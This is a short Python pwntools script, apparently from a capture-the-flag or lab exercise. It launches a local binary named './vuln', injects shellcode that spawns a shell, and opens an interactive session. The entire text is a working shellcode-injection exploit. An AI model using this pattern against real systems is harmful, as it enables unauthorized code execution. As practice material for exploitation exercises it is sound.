from pwn import *

p = process("./vuln")
p.sendline(asm(shellcraft.sh()))
p.interactive()
